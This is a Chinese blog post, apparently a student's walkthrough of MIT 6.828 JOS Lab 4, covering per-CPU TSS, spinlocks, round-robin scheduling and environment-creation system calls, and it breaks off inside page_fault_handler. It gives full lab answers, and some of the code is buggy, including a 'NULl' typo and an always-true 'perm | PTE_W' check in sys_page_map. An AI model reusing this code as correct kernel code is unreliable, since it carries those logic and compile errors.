class="line">trap_init_percpu(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The example code here sets up the Task State Segment (TSS) and</span></span><br><span class="line"><span class="comment">// the TSS descriptor for CPU 0. But it is incorrect if we are</span></span><br><span class="line"><span class="comment">// running on other CPUs because each CPU has its own kernel stack.</span></span><br><span class="line"><span class="comment">// Fix the code so that it works for all CPUs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//   - The macro &quot;thiscpu&quot; always refers to the current CPU&#x27;s</span></span><br><span class="line"><span class="comment">//     struct CpuInfo;</span></span><br><span class="line"><span class="comment">//   - The ID of the current CPU is given by cpunum() or</span></span><br><span class="line"><span class="comment">//     thiscpu-&gt;cpu_id;</span></span><br><span class="line"><span class="comment">//   - Use &quot;thiscpu-&gt;cpu_ts&quot; as the TSS for the current CPU,</span></span><br><span class="line"><span class="comment">//     rather than the global &quot;ts&quot; variable;</span></span><br><span class="line"><span class="comment">//   - Use gdt[(GD_TSS0 &gt;&gt; 3) + i] for CPU i&#x27;s TSS descriptor;</span></span><br><span class="line"><span class="comment">//   - You mapped the per-CPU kernel stacks in mem_init_mp()</span></span><br><span class="line"><span class="comment">//   - Initialize cpu_ts.ts_iomb to prevent unauthorized environments</span></span><br><span class="line"><span class="comment">//     from doing IO (0 is not the correct value!)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ltr sets a &#x27;busy&#x27; flag in the TSS selector, so if you</span></span><br><span class="line"><span class="comment">// accidentally load the same TSS on more than one CPU, you&#x27;ll</span></span><br><span class="line"><span class="comment">// get a triple fault.  If you set up an individual CPU&#x27;s TSS</span></span><br><span class="line"><span class="comment">// wrong, you may not get a fault until you try to return from</span></span><br><span class="line"><span class="comment">// user space on that CPU.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 4: Your code here:</span></span><br><span class="line"><span class="keyword">int</span> cid = thiscpu-&gt;cpu_id;</span><br><span class="line"><span class="comment">// Setup a TSS so that we get the right stack</span></span><br><span class="line"><span class="comment">// when we trap to the kernel.</span></span><br><span class="line">thiscpu-&gt;cpu_ts.ts_esp0 = KSTACKTOP - cid * (KSTKSIZE + KSTKGAP);</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_ss0 = GD_KD;</span><br><span class="line">thiscpu-&gt;cpu_ts.ts_iomb = <span class="keyword">sizeof</span>(struct Taskstate);</span><br><span class="line"><span class="comment">// Initialize the TSS slot of the gdt.</span></span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>)+cid] = SEG16(STS_T32A, (<span class="keyword">uint32_t</span>) (&amp;(thiscpu-&gt;cpu_ts)),</span><br><span class="line"><span class="keyword">sizeof</span>(struct Taskstate), <span class="number">0</span>);</span><br><span class="line">gdt[(GD_TSS0 &gt;&gt; <span class="number">3</span>)+cid].sd_s = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the TSS selector (like other segment selectors, the</span></span><br><span class="line"><span class="comment">// bottom three bits are special; we leave them 0)</span></span><br><span class="line">ltr(GD_TSS0+<span class="number">8</span>*cid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the IDT</span></span><br><span class="line">lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Locking"><a href="#Locking" class="headerlink" title="Locking"></a>Locking</h4><p>目前我们已经有多个CPU同时在执行内核代码了，我们必须要处理竞争条件。最简单粗暴的办法就是使用”big kernel lock”，”big kernel lock”是一个全局锁，进程从用户态进入内核后获取该锁，退出内核释放该锁。这样就能保证只有一个CPU在执行内核代码，但缺点也很明显就是一个CPU在执行内核代码时，另一个CPU如果也想进入内核，就会处于等待的状态。</p><p>锁的数据结构在kern/spinlock.h中:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> locked;       <span class="comment">// Is the lock held?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是一种<strong>spin-locks</strong>。让我们来看看<strong>自旋锁的实现原理</strong>。<br>我们最容易想到的获取自旋锁的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">acquire(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">     <span class="keyword">if</span>(!lk-&gt;locked) &#123;</span><br><span class="line">         lk-&gt;locked = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种实现是有问题的，假设两个CPU同时执行到5行，发现lk-&gt;locked是0，那么会同时获取该锁。问题出在5行和6行是两条指令。</p><p>我们的获取锁，释放锁的操作在kern/spinlock.c中：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">spin_lock(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The xchg is atomic.</span></span><br><span class="line"><span class="comment">// It also serializes, so that reads after acquire are not</span></span><br><span class="line"><span class="comment">// reordered before it. </span></span><br><span class="line"><span class="keyword">while</span> (xchg(&amp;lk-&gt;locked, <span class="number">1</span>) != <span class="number">0</span>)<span class="comment">//原理见：https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf  chapter 4</span></span><br><span class="line"><span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;pause&quot;</span>)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">spin_unlock(struct spinlock *lk)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The xchg instruction is atomic (i.e. uses the &quot;lock&quot; prefix) with</span></span><br><span class="line"><span class="comment">// respect to any other instruction which references the same memory.</span></span><br><span class="line"><span class="comment">// x86 CPUs will not reorder loads/stores across locked instructions</span></span><br><span class="line"><span class="comment">// (vol 3, 8.2.2). Because xchg() is implemented using asm volatile,</span></span><br><span class="line"><span class="comment">// gcc will not reorder C statements across the xchg.</span></span><br><span class="line">xchg(&amp;lk-&gt;locked, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span></span><br><span class="line">xchg(<span class="keyword">volatile</span> <span class="keyword">uint32_t</span> *addr, <span class="keyword">uint32_t</span> newval)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> result;</span><br><span class="line">    <span class="comment">// The + in &quot;+m&quot; denotes a read-modify-write operand.</span></span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;lock; xchgl %0, %1&quot;</span></span></span></span><br><span class="line"><span class="function"><span class="params">         : <span class="string">&quot;+m&quot;</span> (*addr), <span class="string">&quot;=a&quot;</span> (result)</span></span></span><br><span class="line"><span class="function"><span class="params">         : <span class="string">&quot;1&quot;</span> (newval)</span></span></span><br><span class="line"><span class="function"><span class="params">         : <span class="string">&quot;cc&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于spin_lock()获取锁的操作，使用xchgl这个原子指令，xchg()封装了该指令，交换lk-&gt;locked和1的值，并将lk-locked原来的值返回。如果lk-locked原来的值不等于0，说明该锁已经被别的CPU申请了，继续执行while循环吧。因为这里使用的xchgl指令，从addr指向的位置读数据保存到result，然后将newval写到该位置，但是原子的，相当于之前25和26行的结合，所以也就不会出现上述的问题。对于spin_unlock()释放锁的操作，直接将lk-&gt;locked置为0，表明我已经用完了，这个锁可以被别人获取了。</p><p>有了获取锁和释放锁的函数，我们看下哪些地方需要加锁，和释放锁：</p><ol><li>i386_init()中，BSP唤醒其它AP前需要获取内核锁。</li><li>mp_main()中，AP需要在执行sched_yield()前获取内核锁。</li><li>trap()中，需要获取内核锁，因为这是用户态进入内核的唯一入口。</li><li>env_run()中，需要释放内核锁，因为该函数使用iret指令，从内核返回用户态。</li></ol><p>这些添加我们就不放代码了，但是它们的意义值得思考。i386_init, mp_main函数的lock都发生在初始化完成，准备通过sched_yield进入用户进程之前。这时候加锁，让处理器依次加载用户进程，保证同一时刻只有一个处理器在内核态运行。</p><p>其它操作内核锁发生在进入和退出内核态的时候。处理器进入内核态后处在函数trap，故在trap开头加锁，等待其它处理器退出内核态。处理器要进入用户态时放开锁，也就是在env_run的最后，允许其它处理器进入内核态。</p><blockquote><p>Question</p><p>big kernel lock似乎已经确保每次仅仅一个CPU能允许内核代码，为什么我们仍然需要为每个CPU设定一个内核栈</p><p>因为在alltraps到lock_kernel()的过程中，进程已经切换到了内核态，但并没有上内核锁，此时如果有其他CPU进入内核，如果用同一个内核栈，则_alltraps中保存的上下文信息会被破坏，所以即使有大内核栈，CPU也不能用用同一个内核栈。同样的，解锁也是在内核态内解锁，在解锁到真正返回用户态这段过程中，也存在上述这种情况</p></blockquote><h3 id="Round-Robin-Scheduling"><a href="#Round-Robin-Scheduling" class="headerlink" title="Round-Robin Scheduling"></a>Round-Robin Scheduling</h3><p>现要JOS内核需要让CPU能在进程之间切换。目前先实现一个非抢占式的进程调度，需要当前进程主动让出CPU，其他进程才有机会在当前CPU运行。具体实现如下：</p><ol><li>实现sched_yield()，该函数选择一个新的进程运行，从当前正在运行进程对应的Env结构下一个位置开始循环搜索envs数组，找到第一个cpu_status为ENV_RUNNABLE的Env结构，然后调用env_run()在当前CPU运行这个新的进程。</li><li>我们需要实现一个新的系统调用sys_yield()，使得用户程序能在用户态通知内核，当前进程希望主动让出CPU给另一个进程。</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">sched_yield(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">idle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Implement simple round-robin scheduling.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Search through &#x27;envs&#x27; for an ENV_RUNNABLE environment in</span></span><br><span class="line"><span class="comment">// circular fashion starting just after the env this CPU was</span></span><br><span class="line"><span class="comment">// last running.  Switch to the first such environment found.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If no envs are runnable, but the environment previously</span></span><br><span class="line"><span class="comment">// running on this CPU is still ENV_RUNNING, it&#x27;s okay to</span></span><br><span class="line"><span class="comment">// choose that environment.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Never choose an environment that&#x27;s currently running on</span></span><br><span class="line"><span class="comment">// another CPU (env_status == ENV_RUNNING). If there are</span></span><br><span class="line"><span class="comment">// no runnable environments, simply drop through to the code</span></span><br><span class="line"><span class="comment">// below to halt the cpu.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="keyword">size_t</span> start = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="keyword">if</span>(curenv)&#123;</span><br><span class="line">start = ENVX(curenv-&gt;env_id) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; NENV; i++)&#123;</span><br><span class="line">j = (start + i) % NENV;</span><br><span class="line"><span class="keyword">if</span>(envs[j].env_status == ENV_RUNNABLE)&#123;</span><br><span class="line">env_run(&amp;envs[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(curenv &amp;&amp; curenv-&gt;env_status == ENV_RUNNING)&#123;</span><br><span class="line">env_run(curenv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// sched_halt never returns</span></span><br><span class="line">sched_halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，当前CPU在envs数组中找了一圈后没找到合适的Env去执行，需要重新执行之前运行的进程，否则当前CPU就会进入停机状态。</p><blockquote><p>关于Question3、4</p><p>在函数env_run中通过lcr3切换了页表之后，后面的代码依旧可以访问envs数组的成员。这是因为envs在kern_pgdir中被设置为用户态只读，而我们后面的每个用户进程的页表都是通过kern_pgdir为模板来复刻出来的，除了自身的部分，内核的部分肯定都是一样的，也就可以读取这段地址了</p></blockquote><h3 id="System-Calls-for-Environment-Creation"><a href="#System-Calls-for-Environment-Creation" class="headerlink" title="System Calls for Environment Creation"></a>System Calls for Environment Creation</h3><p>尽管现在的内核有能力在多进程之间切换，但是仅限于内核创建的用户进程。目前的JOS还没有提供系统调用，使用户进程能够创建新的进程。</p><p>UNIX提供fork()系统调用来创建新进程，fork()拷贝父进程的地址空间和寄存器状态到子进程。父进程从fork()返回的是子进程的进程ID，而子进程从fork()返回的是0。</p><p>我们将实现一组不同的、更原始的JOS系统调用来创建新的用户模式环境。我们需要完成如下函数：</p><ol><li>sys_exofork()：<br>创建一个新的进程，用户地址空间没有映射，不能运行，寄存器状态和父环境一致。在父进程中sys_exofork()返回新进程的envid，子进程返回0。</li><li>sys_env_set_status：设置一个特定进程的状态为ENV_RUNNABLE或ENV_NOT_RUNNABLE。</li><li>sys_page_alloc：为特定进程分配一个物理页，映射指定线性地址va到该物理页。</li><li>sys_page_map：拷贝页表，使指定进程共享当前进程相同的映射关系。本质上是修改特定进程的页目录和页表。</li><li>sys_page_unmap：解除页映射关系。本质上是修改指定用户环境的页目录和页表。</li></ol><p><strong>exercise7</strong></p><p>实现上述的系统调用</p><p>首先是sys_exofork函数，这个函数其实就是env_alloc函数的封装，就是创建一个空白进程，非常简单</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">envid_t</span></span><br><span class="line">sys_exofork(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Create the new environment with env_alloc(), from kern/env.c.</span></span><br><span class="line"><span class="comment">// It should be left as env_alloc created it, except that</span></span><br><span class="line"><span class="comment">// status is set to ENV_NOT_RUNNABLE, and the register set is copied</span></span><br><span class="line"><span class="comment">// from the current environment -- but tweaked so sys_exofork</span></span><br><span class="line"><span class="comment">// will appear to return 0.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_exofork not implemented&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = env_alloc(&amp;e,curenv-&gt;env_id);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">e-&gt;env_tf = curenv-&gt;env_tf;<span class="comment">//寄存器状态一致</span></span><br><span class="line">e-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">e-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;<span class="comment">//子进程返回0</span></span><br><span class="line"><span class="keyword">return</span> e-&gt;env_id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是sys_env_set_status函数。要使得进程从sys_exofork创建得到的状态ENV_NOT_RUNNABLE变为别的状态，也需要一个系统调用来实现。这个系统调用就是对设置Env状态的改变。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_env_set_status(<span class="keyword">envid_t</span> envid, <span class="keyword">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: Use the &#x27;envid2env&#x27; function from kern/env.c to translate an</span></span><br><span class="line"><span class="comment">// envid to a struct Env.</span></span><br><span class="line"><span class="comment">// You should set envid2env&#x27;s third argument to 1, which will</span></span><br><span class="line"><span class="comment">// check whether the current environment has permission to set</span></span><br><span class="line"><span class="comment">// envid&#x27;s status.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_env_set_status not implemented&quot;);</span></span><br><span class="line"><span class="keyword">switch</span> (status)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ENV_NOT_RUNNABLE:</span><br><span class="line"><span class="keyword">case</span> ENV_RUNNABLE:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = envid2env(envid, &amp;e, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">e-&gt;env_status = status;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是sys_page_alloc通过分配器拿到一些page，然后把他们映射进程的地址空间。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_page_alloc(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *va, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: This function is a wrapper around page_alloc() and</span></span><br><span class="line"><span class="comment">//   page_insert() from kern/pmap.c.</span></span><br><span class="line"><span class="comment">//   Most of the new code you write should be to check the</span></span><br><span class="line"><span class="comment">//   parameters for correctness.</span></span><br><span class="line"><span class="comment">//   If page_insert() fails, remember to free the page you</span></span><br><span class="line"><span class="comment">//   allocated!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_page_alloc not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line">ret = envid2env(envid,&amp;e,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((va &gt;= (<span class="keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;<span class="comment">//一系列判定</span></span><br><span class="line"><span class="keyword">int</span> flag = PTE_U | PTE_P;</span><br><span class="line"><span class="keyword">if</span> ((perm &amp; flag) != flag) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span> =</span> page_alloc(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(pp == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br><span class="line">ret = page_insert(e-&gt;env_pgdir,pp,va,perm);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">page_free(pp);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sys_page_map</code>将一个进程的<code>Page Directory</code>拷贝给另一个进程，让另一个进程获得相同的<strong>地址空间</strong>。这是对<code>page_insert</code>的封装。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_page_map(<span class="keyword">envid_t</span> srcenvid, <span class="keyword">void</span> *srcva,</span><br><span class="line">     <span class="keyword">envid_t</span> dstenvid, <span class="keyword">void</span> *dstva, <span class="keyword">int</span> perm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: This function is a wrapper around page_lookup() and</span></span><br><span class="line"><span class="comment">//   page_insert() from kern/pmap.c.</span></span><br><span class="line"><span class="comment">//   Again, most of the new code you write should be to check the</span></span><br><span class="line"><span class="comment">//   parameters for correctness.</span></span><br><span class="line"><span class="comment">//   Use the third argument to page_lookup() to</span></span><br><span class="line"><span class="comment">//   check the current permissions on the page.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_page_map not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">srce</span>,*<span class="title">dste</span>;</span></span><br><span class="line">ret = envid2env(srcenvid,&amp;srce,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || srce == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">ret = envid2env(dstenvid,&amp;dste,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || dste == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (srcva &gt;= (<span class="keyword">void</span>*)UTOP || dstva &gt;= (<span class="keyword">void</span>*)UTOP || ROUNDDOWN(srcva,PGSIZE) != srcva || ROUNDDOWN(dstva,PGSIZE) != dstva) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag = PTE_U|PTE_P;</span><br><span class="line"><span class="keyword">if</span> ((perm &amp; flag) != flag) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line"><span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp</span> =</span> page_lookup(srce-&gt;env_pgdir,srcva,&amp;pte);</span><br><span class="line"><span class="keyword">if</span>(pp == NULl)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(perm | PTE_W)&#123;</span><br><span class="line"><span class="keyword">if</span> (!(*pte &amp; PTE_W)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">ret = page_insert(dste-&gt;env_pgdir,pp,dstva,perm);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是sys_page_unmap，就是page_remove的封装。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_page_unmap(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *va)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hint: This function is a wrapper around page_remove().</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_page_unmap not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line">ret = envid2env(envid,&amp;e,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((va &gt;= (<span class="keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) </span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">page_remove(e-&gt;env_pgdir,va);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别忘记在syscall函数中加上接口。</p><p>到这里我们就已经完成了part A的所有部分。</p><h2 id="Part-B-Copy-on-Write-Fork"><a href="#Part-B-Copy-on-Write-Fork" class="headerlink" title="Part B: Copy-on-Write Fork"></a>Part B: Copy-on-Write Fork</h2><p>实现fork的方式有两种，一种是将父进程的内容全部拷贝一次给子进程，这样的话子进程和父进程就能实现进程隔离，但是这种方式非常的耗时，需要在物理内存中复制父进程的内容。</p><p>另一种方式叫做<strong>写时复制</strong>，父进程将自己的页目录和页表复制给子进程，这样父进程和子进程就能访问相同的内容。只有当子进程执行写操作时，才复制这一物理页。这样既能做到地址空间隔离，又能节省大量的拷贝工作。用来图来对比这两种方式：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab4/lab4_3_%E5%86%99%E6%97%B6%E6%8B%B7%E8%B4%9Dfork.png" alt="非写时拷贝vs写时拷贝fork"></p><p>要实现写时复制的fork需要先实现用户级别的缺页中断处理函数，这里我们默认认为内核一定正确，没有缺页错误。</p><h3 id="User-level-page-fault-handling"><a href="#User-level-page-fault-handling" class="headerlink" title="User-level page fault handling"></a>User-level page fault handling</h3><p>Copy-on-Write 只是用户级页面错误处理的许多可能用途之一。</p><p>我们将利用用户级页面错误处理方式，来决定如何处理用户空间中的每个页面错误，而不采用传统的Unix方法，因为其产生的错误的破坏性较小。 这种设计的另一个好处是允许程序在定义内存区域时具有很大的灵活性; 稍后我们将使用用户级页面错误处理来映射和访问基于磁盘的文件系统上的文件。</p><p><strong>exercise8</strong></p><p>实现sys_env_set_pgfault_upcall(envid_t envid, void *func)系统调用。该系统调用为指定的用户环境设置env_pgfault_upcall。缺页中断发生时，会执行env_pgfault_upcall指定位置的代码。当执行env_pgfault_upcall指定位置的代码时，栈已经转到异常栈，并且压入了UTrapframe结构。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sys_env_set_pgfault_upcall(<span class="keyword">envid_t</span> envid, <span class="keyword">void</span> *func)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;sys_env_set_pgfault_upcall not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line">ret = envid2env(envid,&amp;e,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span> || e == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> -E_BAD_ENV;</span><br><span class="line">&#125;</span><br><span class="line">e-&gt;env_pgfault_upcall = func;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Normal-and-Exception-Stacks-in-User-Environments"><a href="#Normal-and-Exception-Stacks-in-User-Environments" class="headerlink" title="Normal and Exception Stacks in User Environments"></a>Normal and Exception Stacks in User Environments</h4><p>当缺页中断发生时，内核会返回用户模式来处理该中断。我们需要一个用户异常栈，来模拟内核异常栈。JOS的用户异常栈被定义在虚拟地址UXSTACKTOP。</p><h4 id="Invoking-the-User-Page-Fault-Handler"><a href="#Invoking-the-User-Page-Fault-Handler" class="headerlink" title="Invoking the User Page Fault Handler"></a>Invoking the User Page Fault Handler</h4><p>缺页中断发送时会进入内核的trap()，然后分配page_fault_handler来处理缺页中断。在该函数中应该做如下几件事：</p><ol><li>判断curenv-&gt;env_pgfault_upcall是否设置，如果没有设置也就没办法修复，直接销毁该进程。</li><li>修改esp，切换到用户异常栈。</li><li>在栈上压入一个UTrapframe结构。</li><li>将eip设置为curenv-&gt;env_pgfault_upcall，然后回到用户态执行curenv-&gt;env_pgfault_upcall处的代码。</li></ol><p>UTrapframe结构如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                    &lt;-- UXSTACKTOP</span><br><span class="line">trap-time esp</span><br><span class="line">trap-time eflags</span><br><span class="line">trap-time eip</span><br><span class="line">trap-time eax       start of struct PushRegs</span><br><span class="line">trap-time ecx</span><br><span class="line">trap-time edx</span><br><span class="line">trap-time ebx</span><br><span class="line">trap-time esp</span><br><span class="line">trap-time ebp</span><br><span class="line">trap-time esi</span><br><span class="line">trap-time edi       end of struct PushRegs</span><br><span class="line">tf_err (error code)</span><br><span class="line">fault_va            &lt;-- %esp when handler is run</span><br></pre></td></tr></table></figure><p><strong>exercise9</strong></p><p>按照上面的描述实现page_fault_handler()。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">page_fault_handler(struct Trapframe *tf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> fault_va;</span><br><span class="line"></span><br><span class="line"><span 